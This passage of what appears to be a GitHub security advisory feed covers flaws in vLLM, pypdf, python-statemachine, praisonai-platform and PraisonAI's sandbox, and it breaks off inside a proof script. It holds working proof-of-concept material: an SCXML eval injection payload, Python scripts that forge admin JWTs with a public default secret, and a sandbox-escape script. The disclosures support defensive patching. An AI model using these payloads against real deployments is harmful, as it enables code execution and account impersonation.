        <title type="html"><![CDATA[[vllm] Duplicate Advisory: image EXIF Rotation & PNG tRNS Transparency Not Normalized, Causing Mismatch Between Model Input and Expectations]]></title>
        <id>https://github.com/advisories/GHSA-x8xr-mj9x-6h7w</id>
        <link href="https://github.com/advisories/GHSA-x8xr-mj9x-6h7w"/>
        <updated>2026-06-18T14:31:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-8jr5-v98p-w75m. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>A flaw was found in vLLM, an open-source library for large language model inference. This vulnerability arises from improper handling of image metadata, specifically EXIF orientation and PNG transparency (tRNS) data, during image processing. When images are converted to RGB, transparency information may be implicitly discarded or remapped, leading to unexpected rendering of transparent pixels and distortion of input content. This can result in the model misinterpreting image content, potentially affecting the integrity of processed data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12491">https://nvd.nist.gov/vuln/detail/CVE-2026-12491</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-12491">https://access.redhat.com/security/cve/CVE-2026-12491</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2489786">https://bugzilla.redhat.com/show_bug.cgi?id=2489786</a></li>
<li><a href="https://github.com/advisories/GHSA-x8xr-mj9x-6h7w">https://github.com/advisories/GHSA-x8xr-mj9x-6h7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x8xr-mj9x-6h7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-17T18:35:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Missing stream length values ignore defined limits]]></title>
        <id>https://github.com/advisories/GHSA-jm82-fx9c-mx94</id>
        <link href="https://github.com/advisories/GHSA-jm82-fx9c-mx94"/>
        <updated>2026-06-18T14:28:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to large memory usage, as <code>MAX_DECLARED_STREAM_LENGTH</code> is sometimes ignored. This requires parsing a content stream without a <code>/Length</code> value.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.13.3">pypdf==6.13.3</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3871">#3871</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-jm82-fx9c-mx94">https://github.com/py-pdf/pypdf/security/advisories/GHSA-jm82-fx9c-mx94</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3871">https://github.com/py-pdf/pypdf/pull/3871</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.13.3">https://github.com/py-pdf/pypdf/releases/tag/6.13.3</a></li>
<li><a href="https://github.com/advisories/GHSA-jm82-fx9c-mx94">https://github.com/advisories/GHSA-jm82-fx9c-mx94</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jm82-fx9c-mx94</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T14:28:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-statemachine] python-statemachine SCXML <data expr> Eval Injection]]></title>
        <id>https://github.com/advisories/GHSA-v4jc-pm6r-3vj8</id>
        <link href="https://github.com/advisories/GHSA-v4jc-pm6r-3vj8"/>
        <updated>2026-06-18T14:28:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>python-statemachine 3.1.2 evaluates <code>&lt;data expr="..."&gt;</code> attributes in SCXML documents using Python's <code>eval()</code>. Any application that passes attacker-controlled SCXML content to <code>SCXMLProcessor</code> is vulnerable to arbitrary code execution in the context of the hosting process.</p>
<h3 id="details">Details</h3>
<p><code>SCXMLProcessor.parse_scxml_file()</code> processes SCXML documents and evaluates <code>&lt;data&gt;</code> element <code>expr</code> attributes via the following call chain:</p>
<pre><code>SCXMLProcessor.parse_scxml_file()
SCXMLProcessor.process_definition()
create_datamodel_action_callable()
_create_dataitem_callable()
_eval()
eval()
</code></pre>
<p><code>_eval()</code> calls Python's built-in <code>eval()</code> directly on the expression string without sandboxing or restriction.</p>
<h3 id="poc">PoC</h3>
<pre><code>1. Install:
   pip install python-statemachine==3.1.2

2. Create an SCXML file containing:
   &lt;data id="x" expr="__import__('pathlib').Path('marker.txt').write_text('pwned')"/&gt;

3. Run:
   SCXMLProcessor.parse_scxml_file(DATA_EXPR_CHART)
   SCXMLProcessor.start()

4. During start(), &lt;data expr&gt; reaches _eval(), which calls eval().

5. Result:
   data_marker_before_start: False
   data_marker_after_start: True
   success: True
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an eval injection vulnerability (CWE-95). Remote or local code execution depending on whether the consuming application accepts SCXML content from remote users, uploaded files, configuration, plugins, or other untrusted sources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fgmacedo/python-statemachine/security/advisories/GHSA-v4jc-pm6r-3vj8">https://github.com/fgmacedo/python-statemachine/security/advisories/GHSA-v4jc-pm6r-3vj8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47103">https://nvd.nist.gov/vuln/detail/CVE-2026-47103</a></li>
<li><a href="https://github.com/fgmacedo/python-statemachine/releases/tag/v3.2.0">https://github.com/fgmacedo/python-statemachine/releases/tag/v3.2.0</a></li>
<li><a href="https://www.vulncheck.com/advisories/python-statemachine-rce-via-scxml-eval-injection">https://www.vulncheck.com/advisories/python-statemachine-rce-via-scxml-eval-injection</a></li>
<li><a href="https://github.com/advisories/GHSA-v4jc-pm6r-3vj8">https://github.com/advisories/GHSA-v4jc-pm6r-3vj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4jc-pm6r-3vj8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-18T14:28:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai-platform] praisonai-platform: default JWT signing secret 'dev-secret-change-me' enables token forgery]]></title>
        <id>https://github.com/advisories/GHSA-cwj8-7gp2-ggcw</id>
        <link href="https://github.com/advisories/GHSA-cwj8-7gp2-ggcw"/>
        <updated>2026-06-18T14:27:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="praisonai-platform-default-jwt-signing-secret-dev-secret-change-me">praisonai-platform: default JWT signing secret <code>dev-secret-change-me</code></h1>
<p><strong>Researcher:</strong> Kai Aizen — SnailSploit (@SnailSploit), Adversarial &amp; Offensive Security Research
<strong>Target:</strong> <a href="https://github.com/MervinPraison/PraisonAI">https://github.com/MervinPraison/PraisonAI</a></p>
<hr>
<p><strong>Package:</strong> <code>praisonai-platform</code> on PyPI
<strong>Latest version (and version tested):</strong> <code>0.1.4</code>, current as of 2026-06-01.
<strong>File:</strong> <code>praisonai_platform/services/auth_service.py</code> (sha256 <code>cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258</code>).
<strong>Weakness:</strong> CWE-798 Use of Hardcoded Credentials + CWE-1188 Insecure Default Initialization of Resource.</p>
<hr>
<h2 id="tldr">TL;DR</h2>
<p><code>praisonai_platform/services/auth_service.py</code> lines 25-37:</p>
<pre><code class="language-python">_DEFAULT_SECRET = "dev-secret-change-me"
JWT_SECRET = os.environ.get("PLATFORM_JWT_SECRET", _DEFAULT_SECRET)
JWT_ALGORITHM = "HS256"
JWT_TTL_SECONDS = int(os.environ.get("PLATFORM_JWT_TTL", str(30 * 24 * 3600)))

if JWT_SECRET == _DEFAULT_SECRET and os.environ.get("PLATFORM_ENV", "dev") != "dev":
    raise RuntimeError(
        "PLATFORM_JWT_SECRET must be set to a strong random value in production. "
        "Set PLATFORM_ENV=dev to suppress this check during development."
    )
</code></pre>
<p>The guard at line 33 is meant to catch the "deployed to production with the default secret" failure mode. But it only fires when <strong>both</strong>:</p>
<ul>
<li>the operator left <code>PLATFORM_JWT_SECRET</code> unset (so <code>JWT_SECRET</code> is the default literal), <strong>and</strong></li>
<li>the operator explicitly set <code>PLATFORM_ENV</code> to something other than <code>"dev"</code>.</li>
</ul>
<p>If the operator left <strong>both</strong> env vars unset — the most common mis-deploy — <code>PLATFORM_ENV</code> falls back to <code>"dev"</code>, the second leg of the <code>and</code> evaluates <code>False</code>, and the guard does NOT fire. The server starts up signing every JWT with the public string <code>'dev-secret-change-me'</code>.</p>
<p>The fix is to invert the polarity: refuse startup when the secret is the default <strong>regardless</strong> of <code>PLATFORM_ENV</code>, except when an explicit <code>PLATFORM_ALLOW_DEV_SECRET=true</code> (or equivalent) flag is set. That flips "default-allow" to "default-deny", which is what the line-33 comment implies the author wanted.</p>
<h2 id="root-cause">Root cause</h2>
<pre><code>   Expected behavior, reading line 33 of auth_service.py:
     "Good — the framework refuses to start in production with a
      default-string secret.  I'm safe by construction."

   Actual behavior:
     - PLATFORM_ENV defaults to 'dev' when unset.
     - The guard checks PLATFORM_ENV != 'dev', not PLATFORM_ENV == 'production'
       or "operator explicitly opted in to using the dev secret".
     - So the "deployed without setting any env var" config — typical
       for first-pip-install or quick-start docker — sits silently in
       dev mode with the public secret.

   Impact:
     A guard that requires the operator to EXPLICITLY signal
     "production" cannot catch operators who forgot to signal anything.
     The forgot-to-signal case is the one the guard was designed to
     catch.
</code></pre>
<h2 id="empirical-verification">Empirical verification</h2>
<p><code>poc/poc.py</code> imports the <strong>installed</strong> PyPI package (<code>praisonai-platform==0.1.4</code>) with both env vars unset:</p>
<pre><code>[1] startup guard at auth_service.py:33 status
    Inputs:
      JWT_SECRET    = 'dev-secret-change-me'
      _DEFAULT_SECRET = 'dev-secret-change-me'
      PLATFORM_ENV  = 'dev'  (default 'dev')
    -&gt; JWT_SECRET == _DEFAULT_SECRET: True
    -&gt; PLATFORM_ENV != 'dev':         False
    -&gt; guard fires?                   False

[2] module sha256: cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258
    JWT_ALGORITHM: 'HS256'

[3] forge a JWT signed with the live JWT_SECRET
    forged head: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[4] jwt.decode(forged_token, JWT_SECRET) — same call as
    AuthService._verify_token at auth_service.py:139
    decoded.sub  = admin-user-id-attacker-chose
    decoded.email= admin@example.com

[5] AuthService._verify_token(forged_token) (live method call)
    identity.id    = admin-user-id-attacker-chose
    identity.email = admin@example.com

VERDICT: VULNERABLE
EXIT 0
</code></pre>
<p>Step [5] is the load-bearing one: the attacker token is decoded by the <strong>same method</strong> the FastAPI dependency <code>get_current_user</code> (<code>praisonai_platform/api/deps.py:28</code>) calls. The returned <code>AuthIdentity</code> carries the attacker-chosen <code>sub</code> (user id) and <code>email</code>. Every route protected by <code>Depends(get_current_user)</code> (register/login, workspaces, projects, issues, agents, labels, activity, dependencies) accepts the forged token as proof of identity.</p>
<p>PyJWT itself warns the key is 20 bytes — below the RFC 7518 §3.2 minimum of 32 bytes for HS256.</p>
<h2 id="impact">Impact</h2>
<p>This is the familiar default-secret shape — a hardcoded fallback used to sign authentication tokens — with the additional twist that this one has a guard the author <em>intended</em> to catch the misconfiguration but whose polarity is wrong. Every route in <code>praisonai_platform.api.app:create_app</code> is authenticated via Bearer JWT, and every Bearer JWT is signed and verified with the public default secret. An unauthenticated network-adjacent attacker mints a token carrying any user-id (and any e-mail, name, etc.) they like, and the platform server treats them as that user.</p>
<p>Workspace authorisation (<code>require_workspace_member</code> in <code>deps.py</code>) then checks the forged user is a member of the requested workspace; if the attacker mints a token with <code>sub</code> equal to a known member's id, they bypass that check too. In default deployments, workspace IDs and member IDs are exposed via the activity and labels endpoints to any authenticated client — including the attacker's own forged token.</p>
<h2>Anchors</h2>
<p><code>praisonai-platform</code> 0.1.4, <code>praisonai_platform/services/auth_service.py</code> (file sha256 <code>cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258</code>):</p>
<table>
<thead>
<tr>
<th>Line</th>
<th>Code</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>25</td>
<td><code>_DEFAULT_SECRET = "dev-secret-change-me"</code></td>
<td>Public default literal.</td>
</tr>
<tr>
<td>26</td>
<td><code>JWT_SECRET = os.environ.get("PLATFORM_JWT_SECRET", _DEFAULT_SECRET)</code></td>
<td>Env-var fallback chain.</td>
</tr>
<tr>
<td>27</td>
<td><code>JWT_ALGORITHM = "HS256"</code></td>
<td>HMAC-SHA256 with the default key.</td>
</tr>
<tr>
<td>33-37</td>
<td><code>if JWT_SECRET == _DEFAULT_SECRET and os.environ.get("PLATFORM_ENV", "dev") != "dev": raise RuntimeError(...)</code></td>
<td>The asymmetric guard.  Defaults <code>PLATFORM_ENV</code> to <code>"dev"</code>, so the <code>!= "dev"</code> check evaluates <code>False</code> on the forgot-to-set case.</td>
</tr>
<tr>
<td>108-118</td>
<td><code>_issue_token(...)</code> calls <code>jwt.encode(payload, JWT_SECRET, …)</code></td>
<td>Signing site.</td>
</tr>
<tr>
<td>137-150</td>
<td><code>_verify_token(...)</code> calls <code>jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])</code></td>
<td>Verification site — accepts attacker-forged tokens.</td>
</tr>
</tbody></table>
<p><code>praisonai_platform/api/deps.py:28</code> <code>get_current_user</code> calls <code>AuthService.authenticate({"token": token})</code> which routes to <code>_verify_token</code>. Every router under <code>praisonai_platform.api.app</code> mounts handlers behind this dependency.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Invert the guard polarity:</p>
<pre><code class="language-python">import secrets

_DEFAULT_SECRET = "dev-secret-change-me"
JWT_SECRET = os.environ.get("PLATFORM_JWT_SECRET")
JWT_ALGORITHM = "HS256"
JWT_TTL_SECONDS = int(os.environ.get("PLATFORM_JWT_TTL", str(30 * 24 * 3600)))

if not JWT_SECRET:
    # Allow the dev fallback only when the operator EXPLICITLY signals
    # they understand it.  The default posture is fail-closed.
    if os.environ.get("PLATFORM_ALLOW_DEV_SECRET", "").lower() == "true":
        JWT_SECRET = _DEFAULT_SECRET
    else:
        raise RuntimeError(
            "PLATFORM_JWT_SECRET is required.  "
            "For local development only, set PLATFORM_ALLOW_DEV_SECRET=true."
        )
</code></pre>
<p>This pattern is borrowed from Django's <code>SECRET_KEY</code> first-boot generation (refuses to start when unset) and from the first-boot secret-generation pattern used by many production Docker images. The marker variable (<code>PLATFORM_ALLOW_DEV_SECRET=true</code>) is explicit and grep-able in deployment manifests, so operators who pass it through to production get caught by their own audit / IaC linter rather than slipping past a guard that always passes by default.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ol>
<li>Clone the target: <code>git clone --depth 1 https://github.com/MervinPraison/PraisonAI</code></li>
<li>Run the proof of concept (<code>poc.py</code>) against the cloned source.</li>
<li>Observe the result shown under <em>Verified result</em> below.</li>
</ol>
<h2 id="proof-of-concept">Proof of concept</h2>
<p><code>poc.py</code></p>
<pre><code class="language-python">"""
PoC: praisonai-platform's default JWT signing key is the public literal
'dev-secret-change-me', and the guard intended to refuse production
startup checks the wrong axis — operators who deploy without setting
`PLATFORM_ENV` are treated as `dev` and silently get the public secret.

Prerequisite:
    pip install praisonai-platform pyjwt
"""

import hashlib
import inspect
import os
import sys

def main() -&gt; int:
    # Simulate the realistic "operator pip-installed praisonai-platform
    # and started uvicorn without setting any env var" deployment.
    for env_var in ('PLATFORM_JWT_SECRET', 'PLATFORM_ENV'):
        if env_var in os.environ:
            del os.environ[env_var]

    print('=' * 72)
    print('praisonai-platform — default JWT secret')
    print('=' * 72)

    try:
        from praisonai_platform.services import auth_service
    except RuntimeError as e:
        print(f'\nUNEXPECTED — import raised at startup: {e}')
        return 1

    src = inspect.getsourcefile(auth_service)
    with open(src, 'rb') as f:
        sha = hashlib.sha256(f.read()).hexdigest()

    print()
    print('[1] startup guard at auth_service.py:33 status')
    print(f'      JWT_SECRET    = {auth_service.JWT_SECRET!r}')
    print(f'      _DEFAULT_SECRET = {auth_service._DEFAULT_SECRET!r}')
    print(f"      PLATFORM_ENV  = {os.environ.get('PLATFORM_ENV', 'dev')!r}  (default 'dev')")
    print('    =&gt; Guard does NOT fire on the "operator forgot to set both" failure mode.')

    print()
    print('[2] module sha256 + key bindings on the LIVE installed package')
    print(f'    sha256:          {sha}')
    print(f'    JWT_ALGORITHM:   {auth_service.JWT_ALGORITHM!r}')

    if auth_service.JWT_SECRET != 'dev-secret-change-me':
        print('UNEXPECTED — JWT_SECRET is not the public literal.')
        return 1

    import jwt
    from datetime import datetime, timedelta, timezone

    now = datetime.now(timezone.utc)
    forged_payload = {
        'sub': 'admin-user-id-attacker-chose',
        'email': 'admin@example.com',
        'name': 'Spoofed Admin',
        'iat': now,
        'exp': now + timedelta(seconds=3600),
    }
    forged_token = jwt.encode(forged_payload, auth_service.JWT_SECRET, algorithm=auth_service.JWT_ALGORITHM)
    print()
    print('[3] forge a JWT signed with the live JWT_SECRET')
    print(f'    forged head: {forged_token[:70]}...')

    decoded = jwt.decode(forged_token, auth_service.JWT_SECRET, algorithms=[auth_service.JWT_ALGORITHM])
    print()
    print('[4] jwt.decode(forged_token, JWT_SECRET) — same call as AuthService._verify_token')
    print(f'    decoded.sub  = {decoded.get("sub")}')
    print(f'    decoded.email= {decoded.get("email")}')

    if decoded.get('sub') != 'admin-user-id-attacker-chose':
        print('UNEXPECTED — decoded payload mismatched.')
        return 1

    try:
        svc = auth_service.AuthService(session=None)
        identity = svc._verify_token(forged_token)
    except Exception as e:
        print(f'    (Couldn\'t reach _verify_token: {e!r})')
        identity = None

    if identity is not None:
        print()
        print('[5] AuthService._verify_token(forged_token) (live method call)')
        print(f'    identity.id    = {identity.id}')
        print(f'    identity.email = {identity.email}')

    print()
    print("VULNERABLE: praisonai-platform defaults JWT_SECRET to the public")
    print("            literal 'dev-secret-change-me'.  The line-33 guard only")
    print("            refuses startup when PLATFORM_ENV is explicitly non-'dev'")
    print('            AND the secret is default — operators who forgot to set')
    print('            the env var entirely are silently in dev mode.')
    print('VERDICT: VULNERABLE')
    return 0

if __name__ == '__main__':
    sys.exit(main())
</code></pre>
<h2 id="verification-harness-executed-against-the-cloned-repo">Verification harness (executed against the cloned repo)</h2>
<p>This drives the unmodified upstream code rather than a reproduction.</p>
<pre><code class="language-python">import sys, types, importlib.util, os
os.environ.pop("PLATFORM_JWT_SECRET", None); os.environ.pop("PLATFORM_ENV", None)  # default deploy
BASE = os.path.abspath("repos/PraisonAI/src/praisonai-platform")
def pkg(name, path=None):
    m=types.ModuleType(name)
    if path: m.__path__=[path]
    sys.modules[name]=m; return m
def stub(name, **a):
    m=types.ModuleType(name); [setattr(m,k,v) for k,v in a.items()]; sys.modules[name]=m
pkg("praisonai_platform", BASE+"/praisonai_platform")
pkg("praisonai_platform.services", BASE+"/praisonai_platform/services")
pkg("praisonai_platform.db", BASE+"/praisonai_platform/db")
stub("praisonai_platform.db.models", Member=type("Member",(),{}), User=type("User",(),{}))
stub("sqlalchemy", select=lambda *a,**k:None)
sa_async=types.ModuleType("sqlalchemy.ext.asyncio"); sa_async.AsyncSession=type("AsyncSession",(),{}); sys.modules["sqlalchemy.ext.asyncio"]=sa_async; sys.modules["sqlalchemy.ext"]=types.ModuleType("sqlalchemy.ext")
stub("passlib"); stub("passlib.context", CryptContext=type("CryptContext",(),{"__init__":lambda s,*a,**k:None,"hash":lambda s,x:x,"verify":lambda s,a,b:a==b}))
stub("praisonaiagents")
class AuthIdentity:
    def __init__(self,id,type=None,email=None,name=None): self.id=id; self.type=type; self.email=email; self.name=name
stub("praisonaiagents.auth", AuthIdentity=AuthIdentity)

spec=importlib.util.spec_from_file_location("praisonai_platform.services.auth_service", BASE+"/praisonai_platform/services/auth_service.py")
mod=importlib.util.module_from_spec(spec); mod.__package__="praisonai_platform.services"
sys.modules[spec.name]=mod; spec.loader.exec_module(mod)   # REAL auth_service.py

print("[*] REAL module JWT_SECRET =", repr(mod.JWT_SECRET), "| _DEFAULT_SECRET =", repr(mod._DEFAULT_SECRET))
AuthService=mod.AuthService
svc=AuthService.__new__(AuthService)                       # bypass DB __init__
FakeUser=type("U",(),{"id":"attacker-id","email":"attacker@evil.test","name":"admin"})
tok=svc._issue_token(FakeUser)                              # REAL _issue_token (default secret)
print("[*] REAL _issue_token -&gt;", tok[:46],"...")
ident=svc._verify_token(tok)                                # REAL _verify_token
print("[+] REAL _verify_token -&gt;", {"id":ident.id,"email":ident.email,"name":ident.name})
assert ident and ident.id=="attacker-id" and mod.JWT_SECRET=="dev-secret-change-me"
print("[+] CONFIRMED against real praisonai-platform repo: default 'dev-secret-change-me' issues+verifies a token via the repo's own _issue_token/_verify_token (guard skipped because PLATFORM_ENV defaults to 'dev')")
</code></pre>
<h2 id="verified-result">Verified result</h2>
<p>This PoC was executed against the live upstream code; captured output:</p>
<pre><code>[*] REAL module JWT_SECRET = 'dev-secret-change-me' | _DEFAULT_SECRET = 'dev-secret-change-me'
[*] REAL _issue_token -&gt; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiO ...
[+] REAL _verify_token -&gt; {'id': 'attacker-id', 'email': 'attacker@evil.test', 'name': 'admin'}
[+] CONFIRMED against real praisonai-platform repo: default 'dev-secret-change-me' issues+verifies a token via the repo's own _issue_token/_verify_token (guard skipped because PLATFORM_ENV defaults to 'dev')
</code></pre>
<h2 id="credit">Credit</h2>
<p>Kai Aizen — SnailSploit (@SnailSploit). Adversarial &amp; Offensive Security Research.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cwj8-7gp2-ggcw">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cwj8-7gp2-ggcw</a></li>
<li><a href="https://github.com/advisories/GHSA-cwj8-7gp2-ggcw">https://github.com/advisories/GHSA-cwj8-7gp2-ggcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwj8-7gp2-ggcw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-18T14:27:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI SandlockSandbox falls back to unrestricted subprocess execution when Landlock is unavailable]]></title>
        <id>https://github.com/advisories/GHSA-6jcq-6546-qrrw</id>
        <link href="https://github.com/advisories/GHSA-6jcq-6546-qrrw"/>
        <updated>2026-06-18T14:27:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>praisonai.sandbox.SandlockSandbox</code> is documented and implemented as the kernel-enforced sandbox backend for untrusted code. Its <code>SandboxConfig.native()</code> path lets callers configure allowed filesystem paths and <code>network=False</code>.</p>
<p>On systems where the optional <code>sandlock</code> module imports but reports that Landlock is unavailable, <code>SandlockSandbox.execute()</code> and <code>run_command()</code> do not fail closed. They silently fall back to <code>SubprocessSandbox(self.config)</code>.</p>
<p>That fallback keeps the same high-level native policy object but does not enforce the native filesystem or network boundary during code execution. A sandboxed payload can read files outside the configured allowed path and open network connections despite <code>network=False</code>.</p>
<h2 id="technical-details">Technical Details</h2>
<p><code>SandboxConfig.native()</code> creates a restricted native policy and records caller-provided writable paths plus the requested network posture:</p>
<pre><code class="language-python">return cls(
    sandbox_type="native",
    working_dir=os.getcwd(),
    security_policy=SecurityPolicy(
        allow_network=network,
        allow_file_write=True,
        allow_subprocess=True,
        allowed_paths=resolved_paths,
    ),
    metadata={"writable_paths": resolved_paths, "network": network},
)
</code></pre>
<p><code>SandlockSandbox</code> builds the intended kernel policy with Landlock-backed filesystem allowlisting and network denial:</p>
<pre><code class="language-python">policy = Policy(
    fs_readable=allowed_read_paths,
    fs_writable=allowed_write_paths,
    net_allow_hosts=[] if not limits.network_enabled else None,
    max_memory=f"{limits.memory_mb}M",
    max_processes=limits.max_processes,
    max_open_files=limits.max_open_files,
)
</code></pre>
<p>However, both execution paths fail open when Sandlock is unavailable:</p>
<pre><code class="language-python">if not self.is_available:
    logger.warning("Sandlock not available, falling back to subprocess")
    from .subprocess import SubprocessSandbox
    fallback = SubprocessSandbox(self.config)
    return await fallback.execute(code, language, limits, env, working_dir)
</code></pre>
<p><code>SubprocessSandbox.execute()</code> writes the code to a temp file and runs <code>python</code> with a minimal environment and POSIX rlimits. It does not install a filesystem sandbox, network namespace, syscall filter, chroot, Landlock policy, or path allowlist for the code execution path. The <code>safe_sandbox_path()</code> checks only protect the <code>read_file()</code>, <code>write_file()</code>, and <code>list_files()</code> helper methods.</p>
<h3 id="why-this-is-not-intended-behavior">Why This Is Not Intended Behavior</h3>
<p>The report is not based only on a trust-model disagreement. The code and docs define a concrete boundary:</p>
<ul>
<li>PraisonAI's Sandlock README says the backend provides kernel-level filesystem allowlisting, network isolation, seccomp filtering, and blocks <code>/etc/passwd</code>, SSH keys, AWS credentials, and unauthorized connections.</li>
<li>The security demo creates <code>SandboxConfig.native(writable_paths=["./safe_workspace"], network=False)</code> and labels file and network access as blocked operations.</li>
<li>The upstream <code>sandlock</code> package requires Linux with a compatible Landlock ABI and documents a fail-closed default for missing required protections unless the caller explicitly opts into degraded protection.</li>
<li>PraisonAI's own current security page recommends sandboxed execution and says path traversal protection is enabled by default for local sandbox backends.</li>
</ul>
<p>The bug is the silent fallback from an unavailable kernel-enforced boundary to plain subprocess execution without preserving the configured native policy.</p>
<h2 id="pov">PoV</h2>
<p>Run from a PraisonAI source checkout:</p>
<pre><code class="language-bash">python3 poc/pov_poc.py \
  --repo /path/to/PraisonAI
</code></pre>
<p>The PoV:</p>
<ol>
<li>injects a fake <code>sandlock</code> module that imports successfully but reports no usable Landlock support;</li>
<li>configures <code>SandboxConfig.native(writable_paths=[tenant_a], network=False)</code>;</li>
<li>creates <code>tenant-b-secret.txt</code> outside the configured path;</li>
<li>starts a localhost TCP listener;</li>
<li>executes code through <code>SandlockSandbox.execute()</code>.</li>
</ol>
<p>Observed result on <code>v4.6.58</code>:</p>
<pre><code class="language-json">{
  "child_output": {
    "network_reply": "local-ok",
    "outside_read": "TENANT_B_CANARY"
  },
  "configured_network": false,
  "outside_path_under_allowed": false,
  "sandlock_available": false,
  "sandbox_type": "sandlock",
  "status": "COMPLETED",
  "vulnerable": true
}
</code></pre>
<p>This proves both policy boundaries are crossed:</p>
<ul>
<li>the file read target is not under the configured allowed path;</li>
<li>the localhost network connection succeeds even though the native policy was created with <code>network=False</code>.</li>
</ul>
<p>Full PoV script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""Local-only PoV for poc.

The PoV simulates a system where the optional ``sandlock`` Python package is
installed but kernel Landlock support is unavailable. That is the exact branch
handled by ``SandlockSandbox.execute()``: it logs a warning and falls back to
``SubprocessSandbox``.

No external network is used. The network control is a localhost TCP listener.
No sensitive host files are read. The filesystem control uses temporary tenant
directories and a canary file outside the configured writable path.
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import json
import os
import pathlib
import socket
import sys
import tempfile
import types
from typing import Any

def _repo_paths(repo: pathlib.Path) -&gt; list[str]:
    return [
        str(repo / "src" / "praisonai"),
        str(repo / "src" / "praisonai-agents"),
    ]

async def _accept_once(server: socket.socket) -&gt; str | None:
    loop = asyncio.get_running_loop()

    def accept() -&gt; str:
        conn, _ = server.accept()
        with conn:
            data = conn.recv(128)
            conn.sendall(b"local-ok")
        return data.decode("utf-8", "replace")

    with contextlib.suppress(Exception):
        return await loop.run_in_executor(None, accept)
    return None

async def run_pov(repo: pathlib.Path) -&gt; dict[str, Any]:
    sandlock_path = repo / "src" / "praisonai" / "praisonai" / "sandbox" / "sandlock.py"
    if not sandlock_path.exists():
        return {"repo": str(repo), "has_sandlock": False, "vulnerable": False}

    sys.path[:0] = _repo_paths(repo)

    # Support both the original v4.5.110 API check and the current v4.6.58 API
    # check while forcing the "Sandlock not available" branch.
    sys.modules["sandlock"] = types.SimpleNamespace(
        is_available=lambda: False,
        landlock_abi_version=lambda: 0,
    )

    from praisonai.sandbox.sandlock import SandlockSandbox
    from praisonaiagents.sandbox import ResourceLimits, SandboxConfig

    with tempfile.TemporaryDirectory(prefix="poc-") as temp_root:
        base = pathlib.Path(temp_root)

        # Make the PoV deterministic on systems where "python" is not on PATH.
        bindir = base / "bin"
        bindir.mkdir()
        (bindir / "python").symlink_to(sys.executable)

        allowed = base / "tenant-a"
        allowed.mkdir()
        outside = base / "tenant-b-secret.txt"
        outside.write_text("TENANT_B_CANARY", encoding="utf-8")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        server.settimeout(5)
        port = server.getsockname()[1]

        config = SandboxConfig.native(writable_paths=[str(allowed)], network=False)
        sandbox = SandlockSandbox(config=config)
        await sandbox.start()

        code = f"""
import json
import socket

result = {{}}

try:
    with open({str(outside)!r}, "r") as f:
        result["outside_read"] = f.read()
except Exception as exc:
    result["outside_read_error"] = type(exc).__name__ + ": " + str(exc)

try:
    s = socket.create_connection(("127.0.0.1", {port}), timeout=3)
    s.sendall(b"hello")
    result["network_reply"] = s.recv(32).decode("utf-8", "replace")
    s.close()
except Exception as exc:
    result["network_error"] = type(exc).__name__ + ": " + str(exc)

print(json.dumps(result, sort_keys=True))
"""

        accept_task = asyncio.create_task(_accept_once(server))
